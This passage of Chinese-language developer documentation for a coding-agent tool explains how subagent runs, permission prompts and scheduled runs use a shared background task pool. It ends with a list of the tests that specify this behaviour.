**子智能体运行**（`docs/features/subagents.md`）是一种 `agent` 类型的任务，通过 `Pool.Launch(spec, launch)` 启动。`Launch` 与 `Start` 和 `Adopt` 共用单条调度路径：准入（每会话限制、排空）先发生，因此 `ErrPoolFull` 或 `ErrDraining` 保证回调从未运行且未创建任何东西；然后任务池分配并注册任务 id，之后才用该 id 和任务的输出汇回调，因此子会话在创建时就知道自己属于哪个任务。回调返回一个 `Handle`，其 `Stop` 会取消子上下文，其 `Wait` 会阻塞直到运行落定。`PID` 为 0，`ProcessStartedAt` 为零时间，这就是为什么幸存者探测绝不会把这样的任务误认为它可以杀死的 pid。

这在界面上改变了什么：

- `Spec.Agent` 和 `Snapshot.Agent` 携带智能体身份，在任务行上序列化为 `"agent": {"name": "…", "session_id": "sess_…"}`，位于 `GET .../background-tasks` 和持久化的 `meta.json` 中。子会话 id 在任务池介入之前生成，因此首次发布的快照已经携带它。没有显式标签时，该行读取为 `agent <name>`；运行时设置 `agent <name>: <description>`。
- 输出日志是子任务的进度：每行助手文本对应一行 `[assistant]`，开始时为 `→ tool`，完成时为 `✓` / `✗ tool`，以及一个以 `=== subagent report ===` 开头的收尾块，携带结果、轮次数、持续时间和子任务的最终消息。`background_output` 和 `background_wait` 像任何其他日志一样返回它。
- **停止会取消子任务。** `background_stop`、面板的停止控件、`POST .../stop`、会话删除和服务器排空都会经过该句柄，它会取消子任务的轮次；任务池会等待运行落定后才报告 `stopped`。
- 运行的卡片以智能体名称作为标签，并且在卡片本身上（无需打开它）显示子任务运行的模型及其推理级别、其调用已消耗的 token、它已运行多久，以及**显示对话记录**，它会路由到子会话（`#/s/<child id>`），即一个不进入历史的只读对话记录。shell 任务没有这些：它没有模型也没有对话记录，只有已用时间，以及打开卡片中的输出文本。
- **需要权限回答的分离子任务会在父聊天中询问。** 启动轮次结束后，不再有聊天流来携带提示，因此在 `coddy serve` 下并启用 HTTP 界面时，它会作为 `pending_permission` 附加到正在运行的智能体行（SSE `permission` 事件的有效载荷，带有**子**会话 id，外加 `parent_session_id`、`task_id`、`agent_name` 和 `asked_at`），并在 `GET /coddy/events` 上作为 `subagent_permission` 宣告。Web 界面会在父会话聊天的末尾显示它，带有提示预览及其 **允许** / **拒绝** 按钮，按钮会回答 `POST /coddy/sessions/{child}/permission`；同一提示会到达通过 `--remote` 附加的控制台，对于 Telegram 会话还会到达聊天。等待中的任务继续运行并保留其超时，抽屉保持其快速轮询节奏；提示相关的任何内容都不会被持久化。参见 `docs/features/subagents.md`（分离运行）。
- 该运行是**父**会话的任务，因此像后台命令一样计入父会话的 `max_concurrent`。子任务自行启动的工作（后台运行的 `run_command`、孙任务）会注册在**子**会话 id 下，并持久化在子会话包中；在子任务退役之前会停止并等待它。整个进程可同时运行的子 LLM 循环数量是一个单独的进程范围上限，`subagents.max_concurrent`。

本文档中的其他一切都不变地适用：超时（运行到达时带有由运行时解析的显式 `TimeoutSeconds`，并像任何其他任务一样受 `max_timeout_seconds` 封顶）、持久化、排空、重启后的孤儿标记，以及 HTTP 接口。

**调度运行**（[调度器](../operate/scheduler.md)）是在**任务会话**而不是聊天下的同一种任务：调度器的运行面板就是停靠在调度器抽屉中的这个面板，轮询 `GET /coddy/sessions/{job session}/background-tasks`，其清除会经过 `DELETE /coddy/scheduler/jobs/{job_id}/runs`，因此运行对话记录会随任务记录一起消失。当子任务或调度运行退役时，它自己的已完成任务会离开任务池内存（`Pool.ReleaseSession`），而记录仍留在其会话包中；调度器的保留策略会一次丢弃较旧的运行（`Pool.Forget`）。

## 测试

- 正常路径是由 godog 运行的 Gherkin 规范：`features/background_tasks.feature`（通过工具体现的任务池行为，`internal/tools/shell/bdd_background_test.go`）、`features/background_reap.feature`（早先运行的遗留，`internal/tools/shell/bdd_background_reap_test.go`，它会放弃同一会话包上的真实第二任务池，而不是对重启打桩）、`features/background_tasks_http.feature`（REST 接口，`external/httpserver/bdd_background_test.go`）、`features/background_permissions.feature`（程序范围授权，`internal/permission/bdd_background_permissions_test.go`），以及 `features/foreground_timeout_adoption.feature`（超出其超时的前台命令交接，`internal/tools/shell/bdd_foreground_timeout_test.go`）。
- Web 界面中面板的打开器在 `features/background_tasks_web_ui.feature` 中规定，实时行中正在运行任务段在 `features/turn_progress_web_ui.feature`（`external/ui/bdd_turn_progress_ui_test.go`，每一步都是一个命名的 vitest 测试）中规定。
- 轮次上下文的正在运行任务章节固定在 `internal/agent/turn_context_tasks_test.go`：正在运行的任务按 `background_list` 列出它的方式列出，系统任务和另一会话的任务不会列出，已停止任务会离开该块，关闭后台运行时不会写入任何内容。
- 边界情况位于普通单元测试中：超时解析、并发上限、输出窗口截断、孤儿标记、跨重启 id 唯一性（`internal/bgtask`）、元字符授权拒绝（`internal/permission`），以及 UI 辅助函数（`external/ui/src/ui/tasks/`）。
- 存活探测在 `internal/platform` 中有自己的测试：`procgroup_test.go` 针对两个平台都应有的行为（找到正在运行的进程，找不到已退出的进程，探测可重复），`procgroup_windows_test.go` 针对只有 Windows 会出错的地方：因句柄仍打开而把已杀死进程报告为存活、接受记录未描述的创建时间，以及在这样的记录上杀死 pid。读取 `process_started_at` 存在之前写入的会话包固定在 `internal/bgtask`（`TestLoadPersistedLeavesALegacyRecordWithoutAProcessIdentity`）。
- 任务池上的子智能体运行在 `features/subagents.feature`（`internal/agent/bdd_subagents_test.go`）、`features/subagents_http.feature`（`external/httpserver/bdd_subagents_test.go`，包括在事件流上宣告并通过子会话回答的分离提示）、`features/subagents_detached_prompts.feature`（`internal/serve`）和 `features/subagents_web_ui.feature`（在父聊天中回答提示）中规定；`Pool.Launch` 排序和 `Snapshot.Agent` 持久化是 `internal/bgtask` 中的单元测试。参见 `docs/features/subagents.md`。
- 控制台侧在 `features/cli_tui.feature`（针对真实池化命令的覆盖层：列出、输出、停止；状态行的轮次数）和 `features/cli_remote.feature`（同一覆盖层和针对假远程服务器的 `turn_progress` 行）中规定，覆盖层的渲染和按键、正在运行计数和轮询节奏在 `external/cli/tasks_test.go` 中规定。`examples/cli/capture_tasks.py` 在 pty 中针对脚本化模型驱动真实二进制，并渲染本页和控制台指南的截图。
- 预览服务器在 `features/preview_server.feature`（`internal/tools/preview/bdd_preview_server_test.go`：真实任务池、真实目录和真实 HTTP 客户端）中规定，拒绝情况（工作区外的目录、点文件、外来 `Host`、指向根之外的符号链接）在 `internal/tools/preview/preview_test.go` 中，无计时任务在 `internal/bgtask` 中。
- 针对真实模型的端到端测试：`examples/httpserver/http_e2e_background.py`、`examples/httpserver/http_e2e_background_reap.py`（在任务中途杀死自己的 coddy，并让新的 coddy 清理它）、`examples/acp/acp_e2e_background.py`，以及针对服务器种类的 `examples/httpserver/http_e2e_preview_server.py`。

<!-- docsgen:source sha256=37a286e370aa1d6b -->
